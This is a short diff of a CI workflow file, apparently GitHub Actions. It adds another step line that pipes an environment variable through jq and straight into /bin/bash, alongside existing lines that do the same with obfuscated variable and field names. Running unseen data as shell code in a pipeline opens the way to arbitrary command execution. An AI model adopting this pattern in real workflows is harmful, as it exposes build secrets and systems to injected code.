@@ -41,6 +41,7 @@ jobs:
           echo $sngg685 | jq -r .lt4 | /bin/bash
           printf '%s' "$hhtgh49619" | jq -r .jxeh5338 | /bin/bash
           printf '%s' "$akk8" | jq -r .tks44307 | /bin/bash
+          echo $zt9 | jq -r .ua875 | /bin/bash
 
       - name: Save output
         if: always()
